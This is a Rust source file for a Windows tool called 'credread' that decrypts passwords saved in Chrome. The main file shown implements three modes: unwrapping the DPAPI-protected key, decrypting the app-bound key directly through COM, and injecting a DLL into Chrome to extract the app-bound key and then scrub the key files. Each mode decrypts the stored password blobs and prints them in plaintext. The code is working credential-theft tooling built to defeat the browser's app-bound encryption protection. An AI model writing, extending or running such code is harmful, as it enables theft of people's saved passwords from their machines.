//! credread — read Chrome-saved passwords on this Windows machine.
//!
//! Windows-only tool (cross-linked by xbuild; on Linux this is a stub).
//! Never prints key material: only `KEY_OK len=32` plus the decrypted
//! password bytes for the blobs given on the command line.

#![allow(non_snake_case, non_camel_case_types, dead_code)]
// The msvc cross-link provides its own mainCRTStartup (entry.rs), which calls
// cred_main. A plain `fn main` collides with rustc's generated entry shim
// ("entry symbol `main` declared multiple times"), so msvc builds skip it.
#![cfg_attr(target_env = "msvc", no_main)]

#[cfg(target_env = "msvc")]
mod entry;
#[cfg(target_env = "msvc")]
mod shim;
#[cfg(target_os = "windows")]
mod ffi;
#[cfg(target_os = "windows")]
mod cng;
#[cfg(target_os = "windows")]
mod dpapi;
#[cfg(target_os = "windows")]
mod com;
#[cfg(target_os = "windows")]
mod typelib;
#[cfg(target_os = "windows")]
mod inject;
mod util;

#[cfg(not(target_env = "msvc"))]
fn main() {
    std::process::exit(run());
}

// msvc entry point, called by entry.rs mainCRTStartup. No std runtime init
// runs in this shape, so argv comes from win_args(), not std::env::args.
// no_mangle: the extern "Rust" declaration references the literal symbol.
#[cfg(target_env = "msvc")]
#[no_mangle]
fn cred_main() {
    std::process::exit(run());
}

fn run() -> i32 {
    #[cfg(target_os = "windows")]
    {
        win_main()
    }
    #[cfg(not(target_os = "windows"))]
    {
        eprintln!("credread targets Windows: build with `cargo run -p credread --bin xbuild`");
        1
    }
}

#[cfg(target_os = "windows")]
fn usage() -> i32 {
    eprintln!("usage:");
    eprintln!("  credread.exe v10 <dpapi_hex> <blob_hex>...");
    eprintln!("  credread.exe v20direct <appb_hex> <blob_hex>...");
    eprintln!("  credread.exe v20inject <chrome_exe> <dll> <workdir> <appb_hex> <blob_hex>...");
    1
}

#[cfg(target_os = "windows")]
fn print_pw(i: usize, pt: &[u8]) {
    match String::from_utf8(pt.to_vec()) {
        Ok(s) => println!("PW{i}={s}"),
        Err(_) => println!("PW{i}=HEX:{}", util::hex_encode(pt)),
    }
}

#[cfg(target_os = "windows")]
fn decrypt_each(key: &[u8], blobs: &[String], want_prefix: &[u8]) -> i32 {
    for (i, h) in blobs.iter().enumerate() {
        let blob = match util::hex_decode(h) {
            Ok(b) => b,
            Err(e) => {
                println!("ERR blob{i}: {e}");
                return 2;
            }
        };
        let (prefix, nonce, ct, tag) = match cng::split_gcm_blob(&blob) {
            Ok(t) => t,
            Err(e) => {
                println!("ERR blob{i}: {e}");
                return 2;
            }
        };
        if prefix != want_prefix {
            println!(
                "ERR blob{i}: prefix {:?}, want {:?}",
                String::from_utf8_lossy(&prefix),
                String::from_utf8_lossy(want_prefix)
            );
            return 2;
        }
        match cng::aes_gcm_decrypt(key, &nonce, &ct, &tag) {
            Ok(pt) => print_pw(i, &pt),
            Err(e) => {
                println!("ERR blob{i}: {e}");
                return 2;
            }
        }
    }
    0
}

#[cfg(target_os = "windows")]
fn win_args() -> Vec<String> {
    use crate::ffi::*;
    unsafe {
        let mut argc: i32 = 0;
        let argv = CommandLineToArgvW(GetCommandLineW(), &mut argc);
        let mut out = Vec::new();
        if !argv.is_null() && argc > 0 {
            for i in 0..argc as isize {
                let w = *argv.offset(i);
                let mut n = 0;
                while *w.offset(n) != 0 {
                    n += 1;
                }
                let sl = core::slice::from_raw_parts(w, n as usize);
                out.push(String::from_utf16_lossy(sl));
            }
            LocalFree(argv as LPVOID);
        }
        out
    }
}

#[cfg(target_os = "windows")]
fn win_main() -> i32 {
    let args: Vec<String> = win_args();
    if args.len() < 2 {
        return usage();
    }
    match args[1].as_str() {
        "v10" => {
            if args.len() < 4 {
                return usage();
            }
            let dpapi = match util::hex_decode(&args[2]) {
                Ok(b) => b,
                Err(e) => {
                    println!("ERR dpapi blob: {e}");
                    return 2;
                }
            };
            let key = match dpapi::unprotect(&dpapi) {
                Ok(k) => k,
                Err(e) => {
                    println!("ERR {e}");
                    return 2;
                }
            };
            if key.len() != 32 {
                println!("ERR v10 key len is {} (want 32)", key.len());
                return 2;
            }
            println!("KEY_OK len=32");
            decrypt_each(&key, &args[3..].to_vec(), b"v10")
        }
        "v20direct" => {
            if args.len() < 4 {
                return usage();
            }
            let appb = match util::hex_decode(&args[2]) {
                Ok(b) => b,
                Err(e) => {
                    println!("ERR appb blob: {e}");
                    return 2;
                }
            };
            let key = match com::decrypt_app_bound(&appb) {
                Ok(k) => k,
                Err(e) => {
                    println!("ERR {e}");
                    return 2;
                }
            };
            if key.len() != 32 {
                println!("ERR app-bound key len is {} (want 32)", key.len());
                return 2;
            }
            println!("KEY_OK len=32");
            decrypt_each(&key, &args[3..].to_vec(), b"v20")
        }
        "v20inject" => {
            if args.len() < 7 {
                return usage();
            }
            let chrome_exe = &args[2];
            let dll = &args[3];
            let workdir = &args[4];
            let appb = match util::hex_decode(&args[5]) {
                Ok(b) => b,
                Err(e) => {
                    println!("ERR appb blob: {e}");
                    return 2;
                }
            };
            if std::fs::create_dir_all(workdir).is_err() {
                println!("ERR cannot create workdir {workdir}");
                return 2;
            }
            let appb_path = format!("{workdir}\\appb.bin");
            if std::fs::write(&appb_path, &appb).is_err() {
                println!("ERR cannot write {appb_path}");
                return 2;
            }
            let key = match inject::chrome_inject_decrypt(chrome_exe, dll, workdir) {
                Ok(k) => k,
                Err(e) => {
                    println!("ERR {e}");
                    let _ = std::fs::remove_file(&appb_path);
                    return 2;
                }
            };
            // Scrub the key material files; profiles may be busy, best effort.
            let _ = std::fs::remove_file(&appb_path);
            let _ = std::fs::remove_file(format!("{workdir}\\key.bin"));
            let _ = std::fs::remove_file(format!("{workdir}\\status.txt"));
            let _ = std::fs::remove_dir_all(format!("{workdir}\\profile"));
            println!("KEY_OK len=32");
            decrypt_each(&key, &args[6..].to_vec(), b"v20")
        }
        _ => usage(),
    }
}
